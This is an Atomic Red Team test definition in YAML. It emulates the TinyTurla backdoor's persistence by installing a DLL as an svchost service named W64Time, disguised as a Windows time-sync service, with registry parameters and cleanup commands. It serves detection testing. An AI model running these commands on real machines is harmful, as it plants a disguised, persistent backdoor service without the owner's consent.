# case16

Source: an Atomic Red Team test (YAML).

<!-- Atomic Red Team test (https://github.com/redcanaryco/atomic-red-team), MIT License, Red Canary. -->

---

attack_technique: T1543.003
display_name: 'Create or Modify System Process: Windows Service'
name: TinyTurla backdoor service w64time
auto_generated_guid: ef0581fd-528e-4662-87bc-4c2affb86940
description: |
  It's running Dll as service to emulate the TinyTurla backdoor

  [Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)
supported_platforms:
- windows
input_arguments:
  dllfilename:
    description: It specifies Dll file to run as service
    type: string
    default: PathToAtomicsFolder\T1543.003\bin\W64Time.dll
executor:
  command: |-
    copy "PathToAtomicsFolder\T1543.003\bin\W64Time.dll" %systemroot%\system32\
    sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto
    sc config W64Time DisplayName= "Windows 64 Time"
    sc description W64Time "Maintain date and time synch on all clients and services in the network"
    reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v Hosts /t REG_SZ /d "127.0.0.1" /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v Security /t REG_SZ /d "127.0.0.1" /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v TimeLong /t REG_DWORD /d 300000 /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v TimeShort /t REG_DWORD /d 5000 /f
    sc start W64Time
  cleanup_command: |-
    sc stop W64Time
    sc.exe delete W64Time
    del %systemroot%\system32\w64time.dll
    reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /f
    reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /f
  name: command_prompt
  elevation_required: true

